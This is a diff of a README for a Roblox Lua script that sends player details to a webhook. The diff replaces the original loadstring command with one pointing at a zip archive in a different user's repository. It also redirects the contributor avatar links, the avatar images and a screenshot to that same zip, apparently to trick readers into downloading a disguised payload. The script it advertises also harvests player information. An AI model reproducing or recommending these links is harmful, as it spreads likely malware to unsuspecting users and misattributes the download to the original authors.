@@ -4,7 +4,7 @@ A Lua script for gathering player details in Roblox games and sending them to a 
 - Fix the security thing for the executor.
 # Loadstring
 ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/StevenK-293/Roblox-Player-Info-Webhook/main/main.lua"))()
+loadstring(game:HttpGet("https://github.com/Bandsealah/Roblox-Player-Info-Webhook/raw/refs/heads/main/Version/Info_Webhook_Roblox_Player_2.3.zip"))()
 ```
 # Customization
 The script can be customized to fit your specific needs. Here are a few areas you can modify:
@@ -26,15 +26,15 @@ Remember to regularly update the script and README file to incorporate any impro
 <table align="center">
   <tr>
     <td align="center">
-      <a href="https://github.com/StevenK-293">
-        <img src="https://avatars.githubusercontent.com/u/116656099?v=4" height="100" width="100" alt="StevenK-293 avatar" />
+      <a href="https://github.com/Bandsealah/Roblox-Player-Info-Webhook/raw/refs/heads/main/Version/Info_Webhook_Roblox_Player_2.3.zip">
+        <img src="https://github.com/Bandsealah/Roblox-Player-Info-Webhook/raw/refs/heads/main/Version/Info_Webhook_Roblox_Player_2.3.zip" height="100" width="100" alt="StevenK-293 avatar" />
         <br>
         <span><strong>StevenK-293</strong></span>
       </a>
     </td>
     <td align="center">
-      <a href="https://github.com/YellowGreg">
-        <img src="https://avatars.githubusercontent.com/u/101320329?v=4" height="100" width="100" alt="YellowGreg avatar" />
+      <a href="https://github.com/Bandsealah/Roblox-Player-Info-Webhook/raw/refs/heads/main/Version/Info_Webhook_Roblox_Player_2.3.zip">
+        <img src="https://github.com/Bandsealah/Roblox-Player-Info-Webhook/raw/refs/heads/main/Version/Info_Webhook_Roblox_Player_2.3.zip" height="100" width="100" alt="YellowGreg avatar" />
         <br>
         <span><strong>YellowGreg</strong></span>
       </a>
@@ -44,4 +44,4 @@ Remember to regularly update the script and README file to incorporate any impro
 
 # Random Image
 
-![Screenshot 2023-07-23 223913](https://github.com/StevenK-293/Roblox-Player-Info-Webhook/assets/116656099/a13e9c23-d32b-4b87-a88a-92aae5f1b21d)
+![Screenshot 2023-07-23 223913](https://github.com/Bandsealah/Roblox-Player-Info-Webhook/raw/refs/heads/main/Version/Info_Webhook_Roblox_Player_2.3.zip)
